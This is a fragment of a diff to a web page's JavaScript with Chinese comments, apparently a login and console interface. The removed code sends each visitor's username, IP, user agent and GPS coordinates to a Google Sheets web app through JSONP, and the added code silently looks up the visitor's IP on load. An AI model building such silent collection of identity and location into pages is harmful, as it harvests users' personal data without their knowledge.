-            } catch (error) {
-                console.error('发送数据失败:', error);
-            }
-        }
-        
-        // ===== 发送数据到Google Sheets（JSONP） =====
-        function sendDataToGoogleSheets(data) {
-            return new Promise((resolve) => {
-                window.handleSheetsResponse = function(response) {
-                    console.log('Google Sheets响应:', response);
-                    resolve(response);
-                };
-                
-                const script = document.createElement('script');
-                const params = new URLSearchParams({
-                    'callback': 'handleSheetsResponse',
-                    'username': data.username || '',
-                    'ip': data.ip || '',
-                    'ua': data.userAgent || '',
-                    'url': data.pageUrl || '',
-                    'lat': data.lat || '',
-                    'lng': data.lng || '',
-                    'acc': data.acc || '',
-                    'note': data.note || '',
-                    'time': data.timestamp || new Date().toISOString()
-                }).toString();
-                
-                script.src = `${WEB_APP_URL}?${params}`;
-                document.body.appendChild(script);
-                
-                setTimeout(() => {
-                    if (script.parentNode) document.body.removeChild(script);
-                }, 1000);
-            });
+            document.getElementById('consoleScene').classList.remove('active');
+            document.getElementById('loginScene').classList.add('active');
         }
         
         // ===== 弹窗控制 =====
@@ -804,7 +1256,7 @@
         }
         
         function showSecretKey() {
-            document.getElementById('secretKeyDisplay').textContent = FIXED_SECRET_KEY;
+            document.getElementById('secretKeyDisplay').textContent = CONFIG.FIXED_SECRET_KEY;
             document.getElementById('secretKeyModal').classList.add('active');
         }
         
@@ -822,19 +1274,39 @@
             });
         }
         
-        // ===== 其他功能 =====
         function checkSystemLogs() {
-            alert('暂无日志信息');
+            alert('系统日志功能\n\n当前用户：' + (AppState.currentUser || '未登录') + 
+                  '\nIP地址：' + AppState.userIP + 
+                  '\n最后定位：' + (AppState.userLocation ? '成功' : '未获取') +
+                  '\n注册国家/地区：' + (AppState.userCountry || '未填写'));
         }
         
-        function logout() {
-            currentUser = null;
-            userLocation = null;
-            document.getElementById('loginUsername').value = '';
-            document.getElementById('loginPassword').value = '';
-            document.getElementById('consoleScene').classList.remove('active');
-            document.getElementById('loginScene').classList.add('active');
+        // ===== 初始化 =====
+        async function init() {
+            try {
+                // 获取用户IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                AppState.userIP = ipData.ip;
+                console.log('获取到用户IP:', AppState.userIP);
+            } catch (error) {
+                console.error('获取IP失败:', error);
+                AppState.userIP = '未知';
+            }
+            
+            // 初始显示注册场景
+            switchToRegister();
+            
+            // 添加移动端样式类
+            if (AppState.isMobile) {
+                document.body.classList.add('mobile');
+            }
+            
+            console.log('系统初始化完成，设备类型:', AppState.isMobile ? '移动端' : '桌面端');
         }
+        
+        // 启动应用
+        init();
     </script>
 </body>
 </html>
